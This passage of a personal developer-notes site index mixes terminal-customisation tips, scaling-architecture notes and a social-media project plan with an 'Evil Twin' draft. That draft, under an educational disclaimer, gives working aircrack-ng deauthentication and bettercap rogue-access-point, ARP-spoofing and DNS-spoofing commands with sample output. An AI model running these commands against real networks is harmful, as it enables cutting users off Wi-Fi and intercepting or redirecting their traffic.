}); Add new local CA to the trusted Root Certificate Authorities # Chrome Browse chrome://settings/certificates Choose Authorities then Import Import RootCA.pem we created above Check all options Firefox Make Firefox trusted Root CAs: Browse about:config Type security.enterprise_roots.enabled Enable it to true Import CA certificate: Browse about:preferences#privacy Find Certificats section Choose View Certificates and then Import Import RootCA.pem we created above Confirm References # Wikipedia: List of TCP and UDP port numbers (Nov 13th, 2024) Certbot: Certbot Instructions Nginx on Linux (snap) Letsencrypt: Certificates for localhost (Dec 21st, 2017) Github: How to create an HTTPS certificate for localhost domains (2019) "},{"id":26,"href":"/docs/research/security/evil_twin/","title":"Evil Twin - Draft","section":"Security - Draft","content":" Evil Twin Attack # A type of MitM attack Description: The attacker sets up a rogue Wi-Fi access point that mimics a legitimate network. Devices connect to it, allowing the attacker to intercept all traffic Key Characteristics: The rogue network often has a similar name to the real network (e.g., \u0026ldquo;FreeWiFi\u0026rdquo;) Victims unknowingly connect to the attacker’s network Prevention: Educate users to verify SSIDs before connecting Enable Mutual Authentication on enterprise Wi-Fi setups Demo # DISCLAIMER: This demo is for educational purposes only. The techniques should only be tested on systems you own or have explicit permission to analyze. Misuse of this information is unethical, may violate the law, and could lead to serious consequences. The author takes no responsibility for any damages or misuse arising from this content Disconnect user from wifi # # Install the Aircrack-ng suite, which includes airmon-ng sudo apt install aircrack-ng # Check wireless interface iwconfig # -\u0026gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. wlo1 IEEE 802.11 ESSID:\u0026#34;A14-01\u0026#34; Mode:Managed Frequency:2.417 GHz Access Point: CC:71:90:62:9E:98 Bit Rate=130 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on Link Quality=62/70 Signal level=-48 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:203 Missed beacon:0 docker0 no wireless extensions. # -\u0026gt; Your wireless interface is wlo1 # Disconnect the wireless adapter from managing a network sudo airmon-ng check kill # Enable monitor mode on your wireless adapter sudo airmon-ng start wlo1 # Verify iwconfig # -\u0026gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. docker0 no wireless extensions. wlo1mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on # -\u0026gt; Your wireless adapter with monitor mode is now wlo1mon # Start capture packets sudo airodump-ng wlo1mon # Find the channel of wifi sudo aireplay-ng --test wlo1mon # E.g output 12:26:19 Trying broadcast probe requests... 12:26:21 No Answer... 12:26:21 Found 4 APs 12:26:21 Trying directed probe requests... 12:26:21 CC:71:90:62:9E:98 - channel: 2 - \u0026#39;A14-01\u0026#39; 12:26:27 0/30: 0% 12:26:27 30:4F:75:8F:7F:28 - channel: 2 - \u0026#39;Dinh Bao\u0026#39; 12:26:33 0/30: 0% 12:26:34 C0:B5:D7:89:36:70 - channel: 8 - \u0026#39;Do Hai\u0026#39; 12:26:40 0/30: 0% 12:26:40 E8:43:68:6A:3B:88 - channel: 3 - \u0026#39;Hoang Linh\u0026#39; 12:26:46 0/30: 0% # -\u0026gt; We will taget \u0026#39;A14-01\u0026#39; wifi, its channel is 2 # Stop the process capturing packets and start capture packets only on channel 2 sudo airodump-ng --channel 2 wlo1mon # Deauthenticate target device from wifi by sending deauth packets sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlo1mon # E.g sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 -c F2:2A:23:9E:54:E2 wlo1mon # E.g output 12:24:18 Waiting for beacon frame (BSSID: CC:71:90:62:9E:98) on channel 2 12:24:18 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|42 ACKs] 12:24:32 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|326 ACKs] 12:24:33 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 1|253 ACKs] # Or omit to target all devices sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 wlo1mon Stop capturing packets (exit monitor mode) sudo airmon-ng stop wlo1mon sudo systemctl restart NetworkManager Create the rogue access point # sudo apt update sudo apt install bettercap # Rogue access point sudo bettercap -iface wlo1mon # In bettercap: set wifi.ap.ssid Banana set wifi.ap.bssid DE:AD:BE:EF:DE:AD set wifi.ap.channel 5 set wifi.ap.encryption false wifi.recon on; wifi.ap # Fake dns sudo bettercap -iface wlo1 # In bettercap: net.probe on net.show set arp.spoof.targets 192.168.1.9 set dns.spoof.domains alo1411.team arp.spoof on # E.g output [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets dns.spoof on # E.g output [sys.log] [inf] dns.spoof alo1411.team -\u0026gt; 192.168.1.17 net.sniff References # Bettercap: WiFi "},{"id":27,"href":"/docs/tips/005_passion/","title":"Spark Passion","section":"TIPS","content":" Spark Your Passion # Server Monitoring # Htop # A lightweight, no-frills process manager for resource-constrained environments or terminal purists # Install apt install htop # Run htop Btop # A feature-rich, visually enhanced monitoring experience where modern aesthetics and detailed insights matter # Install apt install btop # Run btop Termial Custom # Before After Oh My Zsh # A framework for managing the configuration of the Zsh # Install Zsh apt install zsh # Install Oh My Zsh using curl sh -c \u0026#34;$(wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)\u0026#34; # Switch to Zsh (if not already the default shell) chsh -s $(which zsh) # Restart your terminal Agnoster theme # # Download necessary font apt install fonts-powerline # Edit file .zshrc (zsh config) vim ~/.zshrc # Change theme to agnoster (inner file .zshrc) ZSH_THEME=\u0026#34;agnoster\u0026#34; Plugins # Auto-suggestions # # Download plugin git clone https://github.com/zsh-users/zsh-autosuggestions.git $ZSH_CUSTOM/plugins/zsh-autosuggestions # Edit file .zshrc (zsh config) vim ~/.zshrc # Add plugin name (inner file .zshrc) plugins=( git zsh-autosuggestions ) Syntax highlighting # # Download plugin git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting # Edit file .zshrc (zsh config) vim ~/.zshrc # Add plugin name (inner file .zshrc) plugins=( git ... zsh-syntax-highlighting ) Cmatrix # Emulate the digital rain effect seen in the movie The Matrix # Install apt install cmatrix # Run cmatrix Vscode Custom # Power Mode extension # Add visual effects and animations as you type Install extension name: Power Mode ID: hoovercj.vscode-power-mode # Open file setting.json of vscode vim ~/.config/Code/User/settings.json // settings.json { // Other settings \u0026#34;powermode.enabled\u0026#34;: true, \u0026#34;powermode.maxExplosions\u0026#34;: 10, \u0026#34;editor.codeActionsOnSave\u0026#34;: null, \u0026#34;powermode.explosions.size\u0026#34;: 15, \u0026#34;powermode.explosions.frequency\u0026#34;: 2, \u0026#34;powermode.explosions.offset\u0026#34;: 0.215, \u0026#34;powermode.explosions.customExplosions\u0026#34;: [ \u0026#34;https://media.giphy.com/media/sLMRyFR4eIEgnFe4mK/giphy.gif\u0026#34;, \u0026#34;https://media.giphy.com/media/RFvv2miX3KHcOkBwns/giphy.gif\u0026#34;, \u0026#34;https://media.giphy.com/media/8Hw8ei9OiUXIUlHEBy/giphy.gif\u0026#34; ], \u0026#34;powermode.explosions.backgroundMode\u0026#34;: \u0026#34;mask\u0026#34;, \u0026#34;powermode.explosions.gifMode\u0026#34;: \u0026#34;restart\u0026#34;, \u0026#34;powermode.explosions.explosionOrder\u0026#34;: \u0026#34;sequential\u0026#34;, \u0026#34;powermode.explosions.duration\u0026#34;: 1000, \u0026#34;powermode.explosions.customCss\u0026#34;: { \u0026#34;mix-blend-mode\u0026#34;: \u0026#34;color-dodge\u0026#34; }, \u0026#34;powermode.shake.enabled\u0026#34;: false } Todo Tree extension # This extension quickly searches your workspace for comment tags like TODO and FIXME, and displays them in a tree view in the activity bar Install extension name: Todo Tree ID: Gruntfuggly.todo-tree References # Github: Power mode setup templates Scottspence: My Zsh Config (April 14th, 2022) "},{"id":28,"href":"/docs/research/scale/","title":"Scale - draft","section":"RESEARCH","content":" Scale # Monolith architecture # The server in itself is capable and responsible for all the tasks that have to be performed and can perform every step needed to perform a function Tasks: Authorization, Presentation, Database, Business Server side rendering (SSR) # Splitting server # Database splitting # Assume your app have a stable traffic Your data is not maintain steady, it always grows up. So database is the first thing we need to splitting out from our server and be standalone For later you will need to upgrade your DB (whatever scale out or scale up) Client splitting \u0026amp;\u0026amp; Client side rendering (CSR) # Example Flow:\nThe user enters https://gg.com in the browser bar The user\u0026rsquo;s browser send an request to google GG\u0026rsquo;s gateway receive this request first: Parse the request -\u0026gt; { method: GET, url: gg.com } -\u0026gt; This request is belong to frontend Ask and receive index.html, css, js from gg\u0026rsquo;s frontend server Response back these things to user The user\u0026rsquo;s browser receive materials and then render gg website The user enters The biggest butterfly in the gg search Gg website ask browser to send a request to gg\n{ method: POST, url: gg.com/api, body: The biggest butterfly } After receive this request, gateway routes it to the backend server due to path /api Backend server progress the request, get some data from database and response back The gg website using JS to rerender the interface corresponding with the response Mobile # In mobile architecture\nApplication is already installed in the device, they not need an frontend server to serve interface anymore Only need backend server if it need to process some business, CRUD data, \u0026hellip; Scale # Vertical # Also called “scale up” Vertical scaling is based on the idea of adding more power(CPU, RAM) to existing systems, basically adding more resources Pros: Simplicity: less complicated maintenance, less need for software changes, less complex process communication Cost-effective: upgrading a pre-existing server costs less than purchasing a new one Cons: Higher possibility for downtime Single point of failure Upgrade limitations Horizontal # Also called “scale out” Horizontal scaling is based on the idea of adding more machines to our pool of resources. Pros: Fewer periods of downtime Increased resilience and fault tolerance Cons: Increased complexity of maintenance and operation Increased Initial costs Load balancer # A load balancer is a device that sits between the user and the server group and acts as an invisible facilitator, ensuring that all resource servers are used equally Run application server maintenance or upgrades without application downtime Prevents traffic bottlenecks at any one server Route traffic through a group of network firewalls for additional security Algorithms # Round-robin: Route traffic to the servers turn by turn or in a round-robin fashion Weighted round-robin: Servers with higher weights will receive more incoming application traffic Least connection: Which servers have the fewest active connections and sends traffic to those servers Resource-based: Check the server resources, such as its computing capacity and memory. Then, the load balancer checks the agent for sufficient free resources before distributing traffic to that server \u0026hellip; Database Scaling # Replication # All the slaves are connected with the master If the master DB goes down an eligible slave will hold the new master High Availability of data disasters recovery No downtime for maintenance (like backups index rebuilds and compaction) Sharding # Sharding is a method for distributing large dataset and allocating it across multiple servers How it work? # Consistent Hashing Simple example # We have 3 databases (shards) store products, named from 0 to 2 We using product id to determind which shard will be used Each product come to our servers: id will mod with 3 If equal 0, shard 0 will be used to read or write this data Similar to others Combination # Caching # Everything stored on frontend can be changed by the user so this is potential security vulnerability\nThis is the main difference between backend and frontend caching, backend caching can\u0026rsquo;t be edited by the user\nFrontend # On the frontend, a browser or the client application caches data like a header image the first time your user accesses it. The next time they access that same content, the frontend loads the cached files to improve performance\nBrowser caching # Browser caching is a technique that allows you to store certain files, such as CSS, JavaScript, and images\nBackend # Backend development uses caching to reduce the load on the application server. What you store in the backend cache depends on your application itself. Cached content includes static pages, database query results, API responses, session data, images, and videos\nCDN - Content Delivery Network # Implementing CDN caching requires integrating your website with a CDN provider. This involves configuring your DNS settings to point to the CDN’s servers and setting up caching rules to determine which files should be cached and for how long\nRamble on about the limit of the speed of light Quantum entanglement promises to enable instant communication or data transmission in the future, regardless of distance\nHowever, as of now, we use fiber optic cables, and the latency is significantly higher when transfering data from a distant location compared to a nearby one\nA question is: Aren\u0026rsquo;t data packets traveling at the speed of light? If they did, would the difference in latency between close and far locations be significant?\nFor example:\nThe distance from Ho Chi Minh City to New York is 14,275 km, or 14,275,000 meters The speed of light is approximately 300,000,000 m/s, or 300,000 meters per millisecond (m/ms) The time for a data packet to travel one way would be around 47.583 ms, so a round trip (sending and receiving) would take about 95 ms But this is in an ideal scenario where:\nThe server takes 0 ms to process the request and sends the response instantly The signal is traveling in a vacuum at the speed of light (300,000 m/ms) In reality:\nThe speed of data transmission through fiber optic cables is lower—around 200,000 kilometers per second, or 200,000 m/ms Even with a direct fiber optic connection between Ho Chi Minh City and a server in New York, the round trip would take at least 142.75 ms So even with a direct connection to a New York server, I\u0026rsquo;d still be playing League of Legends with a ping of over 140 ms!\nData center # Message queue # Reference # Geeksforgeeks: What is a monolith server ? (19 Nov, 2021) Cloudzero: Horizontal Vs. Vertical Scaling: How Do They Compare? (May 05, 2023) Amazon: What is Load Balancing? Linkedin: How Web is limited by the speed of light? (May 16, 2022) "},{"id":29,"href":"/docs/research/social_media/","title":"Social Media - Draft","section":"RESEARCH","content":" Social Media: fakebut.site # Architecture # Frontend: Vite-ReactJS, Argon (Consider replace with TaiwinCSS) Backend: ExpressJS, Golang, MongoDB Ops: Git Action, Docker, EC2 Login # Front: Login/Register page Setup Vite Routing handling Back: API login/register Cookie base Consider the possibility? Because the strickly of cookie when work with cross-origin (front-end origin vs backend origin) Solution: using the nginx to become the gateway to serve backend api and frontend site Token base SSO Chat # Websocket Post # Comment # Notification # Admin management # "}]